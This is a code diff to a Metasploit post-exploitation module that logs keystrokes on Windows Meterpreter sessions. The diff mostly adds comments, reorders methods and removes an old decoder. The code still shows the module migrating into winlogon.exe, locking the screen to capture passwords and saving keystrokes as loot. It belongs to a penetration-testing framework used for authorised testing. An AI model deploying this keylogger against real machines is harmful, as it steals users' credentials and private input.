@@ -25,7 +25,8 @@ class MetasploitModule < Msf::Post
           password.
             },
         'License'        => MSF_LICENSE,
-        'Author'         => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
+        'Author'         => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>',
+                              'Josh Hale <jhale85446[at]gmail.com>'],
         'Platform'       => [ 'win' ],
         'SessionTypes'   => [ 'meterpreter', ]
 
@@ -46,14 +47,8 @@ class MetasploitModule < Msf::Post
       ], self.class)
   end
 
-  def setup
-    @running = false
-    @logfile = nil
-  end
 
-  # Run Method for when run command is issued
   def run
-
     print_status("Executing module against #{sysinfo['Computer']}")
     if datastore['MIGRATE']
       if datastore['CAPTURE_TYPE'] == "pid"
@@ -72,11 +67,24 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  # Returns the path name to the stored loot filename
+  # Initial Setup values
+  #
+  # @return [void] A useful return value is not expected here
+  def setup
+    @running = false
+    @logfile = nil
+  end
+
+  # This function sets the log file and loot entry.
+  #
+  # @return [StringClass] Returns the path name to the stored loot filename
   def set_log
     store_loot("host.windows.keystrokes", "text/plain", session, "Keystroke log on #{sysinfo['Computer']} with user #{client.sys.config.getuid} started at #{Time.now.to_s}\n\n", "keystrokes.txt", "User Keystrokes")
   end
 
+  # This locks the Windows screen if so requested in the datastore.
+  #
+  # @return [void] A useful return value is not expected here
   def lock_screen
     print_status("Locking the desktop...")
     lock_info = session.railgun.user32.LockWorkStation()
@@ -100,10 +108,7 @@ class MetasploitModule < Msf::Post
         print_error("UAC is enabled on this host! Winlogon migration will be blocked. Using Explorer instead.")
       else
         success = migrate(get_pid("winlogon.exe"), "winlogon.exe", session.sys.process.getpid)
-        if datastore['LOCKSCREEN'] && success
-          lock_screen
-          return success
-        end
+        lock_screen if datastore['LOCKSCREEN'] && success
         return success
       end
     end
@@ -189,8 +194,11 @@ class MetasploitModule < Msf::Post
   end
 
 
-  # Method for starting the keylogger
-  def startkeylogger()
+  # This function starts the keylogger
+  #
+  # @return [TrueClass] keylogger started successfully
+  # @return [FalseClass] keylogger failed to start
+  def startkeylogger
     begin
       print_status("Starting the keystroke sniffer...")
       session.ui.keyscan_start
@@ -203,6 +211,10 @@ class MetasploitModule < Msf::Post
     end
   end
 
+  # This function dumps the keyscan and uses the API function to parse
+  # the extracted keystrokes.
+  #
+  # @return [void] A useful return value is not expected here
   def write_keylog_data
     output = session.ui.keyscan_extract(session.ui.keyscan_dump)
 
@@ -212,47 +224,14 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  # Method for writing found keystrokes
-  def write_keylog_data_old
-    data = session.ui.keyscan_dump
-    outp = ""
-    data.unpack("n*").each do |inp|
-      fl = (inp & 0xff00) >> 8
-      vk = (inp & 0xff)
-      kc = VirtualKeyCodes[vk]
-
-      f_shift = fl & (1<<1)
-      f_ctrl  = fl & (1<<2)
-      f_alt   = fl & (1<<3)
-
-      if(kc)
-        name = ((f_shift != 0 and kc.length > 1) ? kc[1] : kc[0])
-        case name
-        when /^.$/
-          outp << name
-        when /shift|click/i
-        when 'Space'
-          outp << " "
-        else
-          outp << " <#{name}> "
-        end
-      else
-        outp << " <0x%.2x> " % vk
-      end
-    end
-
-    #sleep(2)
-    if not outp.empty?
-      print_good("Keystrokes captured #{outp}") if datastore['ShowKeystrokes']
-      file_local_write(@logfile,"#{outp}\n")
-    end
-  end
-
-  # Method for Collecting Capture
+  # This function is used to manage the key recording and timing
+  # Note: Capturing all exceptions to mute the timeout exception.
+  #
+  # @return [void] A useful return value is not expected here
   def keycap
     keytime = datastore['INTERVAL'].to_i
     rec = 1
-    #Creating DB for captured keystrokes
+    #Creating DB entry for captured keystrokes
     print_status("Keystrokes being saved in to #{@logfile}")
 
     #Inserting keystrokes every number of seconds specified
@@ -274,11 +253,15 @@ class MetasploitModule < Msf::Post
         end
         @running = false
         rec = 0
-        self.kill
       end
     end
   end
 
+  # This function writes off the last set of key strokes
+  # It will wait two times the set interval to ensure that the last
+  # set of keys get logged.
+  #
+  # @return [void] A useful return value is not expected here
   def finish_up
     print_status "Saving last few keystrokes..."
     write_keylog_data
@@ -289,6 +272,14 @@ class MetasploitModule < Msf::Post
     @running = false
   end
 
+  # This function cleans up the module.
+  # finish_up was added for clean exit when this module is run
+  # as a job.
+  #
+  # Known Issue: This gets run twice when killing the job. Not sure why.
+  # Does not cause issues with output or errors.
+  #
+  # @return [void] A useful return value is not expected here
   def cleanup
      finish_up if @running && session.alive?
   end
